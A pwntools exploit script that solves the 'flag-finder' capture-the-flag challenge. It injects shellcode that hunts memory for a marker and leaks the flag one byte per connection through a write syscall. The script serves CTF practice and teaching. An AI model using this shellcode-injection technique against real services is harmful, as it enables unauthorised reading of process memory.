from pwn import *

REMOTE = 1
HOST = "flag-finder.ctf.trailblaze.space"
PORT = 30012
# HOST = "127.0.0.1"
# PORT = 1337

# Set up pwntools for the correct architecture
prog = './flag-finder'
context.binary = exe = ELF(prog)
# context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-h"]
rop = ROP(prog)
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([prog] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([prog] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+440
b *main+317
continue
'''.format(**locals())

i=0
flag=""
while "}" not in flag:
    if REMOTE:
        io = remote(HOST, PORT)
    else:
        io = process(prog)
    # io = start()
    # io.interactive()
    shellcode="""
        mov rcx,0
        mov esi, 0x72616570
        xor rax,rax
    loop:
        mov rax,[rbx+rcx]
        cmp eax, esi
        je found
        inc rcx
        cmp rcx,0x1000
        jle loop

    found:
        xor rax,rax
        mov rax,rbx
        add rax,rcx
        add rax,%s
        push 1
        pop rdi
        xor edx, edx
        mov dl, 0x1
        mov rsi, rax
        push 1
        pop rax
        syscall
    """

    io.recvuntil(b"starting from ")
    data=io.recvline()
    flag_land=int(data.strip(),16)
    print(hex(flag_land))

    # print(shellcode % (i))
    code=asm(shellcraft.mov('rbx',flag_land))+asm(shellcode % (i))
    assert len(code) < 0x100, "Shellcode too big!"
    # assert b'\x0a' not in code, "Shellcode contains invalid bytes"
    # log.info(f"shellcode :{code}")

    # with open("shell.bin","wb") as f:
    #     f.write(code)
    io.recv(4000)
    io.sendline(code)
    flag+=io.clean().decode()
    print(flag)
    i+=1